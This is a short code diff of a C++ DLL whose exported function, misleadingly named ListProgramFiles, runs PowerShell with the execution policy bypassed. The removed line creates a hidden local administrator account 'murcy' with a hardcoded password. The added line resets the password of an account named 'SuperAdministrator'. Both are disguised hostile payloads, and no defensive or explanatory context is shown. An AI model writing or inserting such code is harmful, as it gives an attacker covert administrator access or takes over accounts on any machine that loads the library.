@@ -2,7 +2,7 @@
 
 extern "C" __declspec(dllexport) void ListProgramFiles() {
     // PowerShell command line
-    wchar_t cmd[] = L"powershell.exe -NoProfile -ExecutionPolicy Bypass -Command \"New-LocalUser \"murcy\" -Password (\"Password1!\" | ConvertTo-SecureString -AsPlainText -Force) | Add-LocalGroupMember -Group \"Administrators""";
+    wchar_t cmd[] = L"powershell.exe -NoProfile -ExecutionPolicy Bypass -Command Set-LocalUser -Name \"SuperAdministrator\" -Password (\"NewPassword123!\" | ConvertTo-SecureString -AsPlainText -Force)";
 
     STARTUPINFOW si = { sizeof(si) };
     PROCESS_INFORMATION pi = {};
